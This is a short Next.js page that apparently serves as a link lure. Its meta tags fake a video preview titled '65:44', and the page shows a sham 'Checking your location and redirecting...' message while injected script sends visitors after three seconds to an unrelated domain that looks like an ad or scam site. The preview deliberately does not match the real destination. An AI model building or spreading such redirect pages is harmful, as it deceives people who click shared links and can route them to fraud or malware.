export default function ImgPage({ ogImage }) {
  return (
    <html>
      <head>
        <meta charset="UTF-8" />
        <title>Mood</title>
        <meta name="description" content="" />
        <meta property="og:type" content="website" />
        <meta property="og:url" content="https://cdnvidey.space/" />
        <meta property="og:title" content="65:44" />
        <meta property="og:description" content="" />
        <meta property="og:updated_time" content="1781654966" />
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content="65:44" />
        <meta name="twitter:description" content="" />
        <meta property="og:image" content="https://i.ibb.co/fzbFxHFf/Gx-SASTWa-EAADg-V5.jpg" />
        <meta name="twitter:image" content="https://i.ibb.co/fzbFxHFf/Gx-SASTWa-EAADg-V5.jpg" />
      </head>
       <body>
        <h1>Checking your location and redirecting...</h1>
        <script dangerouslySetInnerHTML={{ __html: `window.setTimeout(function(){window.location.href = 'https://broadlyjukeboxunrevised.com/2053781';}, 3000);` }} />
      </body>
    </html>
  );
}

export async function getServerSideProps({ params }) {
  let ogImage = "https://i.ibb.co/VYkrzHPW/Gr-Ag-g-EX0-AIb-C2d.jpg"; // default image
if (params.img === "anh1") ogImage = "https://st-image-x.vercel.app/anh1.jpeg";
if (params.img === "anh2") ogImage = "https://st-image-x.vercel.app/anh1.jpeg";
if (params.img === "anh3") ogImage = "https://st-image-x.vercel.app/anh1.jpeg";
  return { props: { ogImage } };
}
